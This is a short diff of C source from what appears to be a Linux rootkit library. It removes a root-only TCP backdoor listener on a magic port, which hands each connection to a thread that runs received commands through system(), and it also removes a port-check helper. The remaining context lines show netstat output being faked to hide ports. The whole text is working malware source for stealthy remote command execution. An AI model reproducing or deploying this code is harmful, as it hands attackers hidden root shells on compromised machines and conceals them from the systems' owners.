@@ -104,7 +104,6 @@ int fake_netstat(char *pathname, char *newfile){
                 #ifdef DEBUG
                 printf("[-] hiding port %d -> %04X\n", port, port);
                 #endif
-                fflush(stdout);
                 sprintf(ports[maxp], "%s", hex_port);
                 maxp ++;
             }
@@ -336,58 +335,4 @@ void *backdoor(void *args){
     system(buff);
     shutdown(fd, 2);
     close(fd);
-}
-
-void start_tcp_backdoor(){
-    if (geteuid() != 0){
-        return;
-    }
-    #ifdef DEBUG
-    printf("[-] starting tcp backdoor..")
-    #endif
-    int socket_desc;
-    socket_desc=socket(AF_INET,SOCK_STREAM,0);
-    if (socket_desc==-1){
-        return;
-    }
-    
-    struct sockaddr_in address;
-    address.sin_family = AF_INET;
-    address.sin_addr.s_addr = INADDR_ANY;
-    address.sin_port = htons(MAGIC_PORT);
-
-    if (bind(socket_desc,(struct sockaddr *)&address,sizeof(address)) < 0){
-        return;
-    }
-    listen(socket_desc, 1024);
-    if (!hooked_accept){
-        hooked_accept = load_libc("accept");
-    }
-    while (1){
-        int size = sizeof(address);
-        int rc = hooked_accept(socket_desc, &address, &size);
-        if (rc > 0){
-            pthread_t thread;
-            int *pfd = malloc(sizeof(*pfd));
-            *pfd = rc;
-            pthread_create(&thread, NULL, backdoor, pfd);
-        }
-    }
-}
-
-int is_port_usable(int port){
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if(sock < 0) {
-        return 0;
-    }
-    struct sockaddr_in serv_addr;
-    bzero((char *) &serv_addr, sizeof(serv_addr));
-    serv_addr.sin_family = AF_INET;
-    serv_addr.sin_addr.s_addr = INADDR_ANY;
-    serv_addr.sin_port = port;
-    if (bind(sock, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) < 0) {
-        return 0;
-    }
-    close(sock);
-    return 1;
 }
